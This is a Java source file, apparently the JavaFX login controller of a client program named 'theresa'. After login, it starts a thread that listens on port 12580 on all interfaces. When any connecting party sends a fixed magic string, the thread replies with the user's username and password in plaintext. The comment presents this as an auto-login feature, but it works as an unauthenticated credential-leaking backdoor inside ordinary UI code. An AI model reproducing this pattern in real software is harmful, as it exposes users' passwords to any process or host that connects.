import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.FixedRecvByteBufAllocator;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.string.StringDecoder;
import io.netty.handler.codec.string.StringEncoder;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.PasswordField;
import javafx.scene.control.TextField;
import theresa.Main;
import theresa.connection.NettyClientHandler;
import theresa.protection.RSAUtils;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.Objects;


public class HelloController {

    @FXML
    public TextField username;
    @FXML
    public PasswordField password;

    @FXML
    public javafx.scene.control.Button login;

    @FXML
    public void onButtonClick(ActionEvent event) {
        Main.INSTANCE.name = username.getText();
        Main.INSTANCE.password = (password.getText());

        Map<String, String> keyMap = RSAUtils.createKeys(2048);
        Main.INSTANCE.publicKey = keyMap.get("publicKey");
        Main.INSTANCE.privateKey = keyMap.get("privateKey");

        //Get The Auto-Login System By Theresa.exe

        //New Thread SUS
        new Thread(() -> {
            ServerSocket serverSocket = null;
            try {
                serverSocket = new ServerSocket(12580);
                Socket socket = serverSocket.accept();
                DataInputStream input = null;
                DataOutputStream output = null;
                try {
                    input = new DataInputStream(socket.getInputStream());
                    output = new DataOutputStream(socket.getOutputStream());
                } catch (IOException e) {
                    e.printStackTrace();
                }
                while (!serverSocket.isClosed()) {
                    String received = Objects.requireNonNull(input).readUTF();
                    if (received.equals("FuckYou"))
                        Objects.requireNonNull(output).writeUTF(Main.INSTANCE.name + ":" + Main.INSTANCE.password);
                }

            } catch (IOException e) {
                try {
                    serverSocket.close();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        }).start();


    }



}